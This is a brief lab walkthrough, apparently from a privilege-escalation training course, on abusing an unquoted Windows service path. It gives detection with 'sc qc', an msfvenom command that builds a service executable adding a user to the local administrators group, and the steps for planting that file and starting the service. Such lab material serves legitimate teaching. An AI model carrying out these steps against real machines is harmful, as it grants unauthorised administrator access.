## Service Escalation - Unquoted Service Paths

Detection

Windows VM

1. Open command prompt and type: sc qc unquotedsvc
2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.

Exploitation

Kali VM

1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
2. Copy the generated file, common.exe, to the Windows VM.

Windows VM

1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
2. Open command prompt and type: sc start unquotedsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

For additional practice, it is recommended to attempt the TryHackMe room Steel Mountain (https://tryhackme.com/room/steelmountain).